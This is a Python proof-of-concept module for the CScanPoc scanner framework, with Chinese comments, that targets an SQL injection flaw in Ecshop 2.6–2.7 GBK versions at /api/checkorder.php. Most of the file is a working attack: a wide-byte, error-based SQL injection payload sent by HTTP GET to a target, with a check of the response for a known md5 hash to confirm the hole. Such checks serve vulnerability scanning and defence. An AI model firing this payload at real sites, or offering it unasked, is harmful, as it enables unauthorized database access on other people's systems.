# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0009'  # 平台漏洞编号，留空
    name = 'Ecshop SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-15'  # 漏洞公布时间
    desc = '''
        Ecshop /api/checkorder.php 注入通杀2.6-2.7 GBK版本。
    '''  # 漏洞描述
    ref = 'http://www.shellsec.com/tech/74933.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.6-2.7 GBK版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a334fddd-ec0c-4feb-a3e4-3a5324dbf7f1'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/api/checkorder.php?username=%ce%27%20and%201=2%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20md5(3.1415)%20%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23"
            url = arg + payload
            req = requests.get(url)
            if req.status_code == 200 and "63e1f04640e83605c1d177544a5a0488" in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
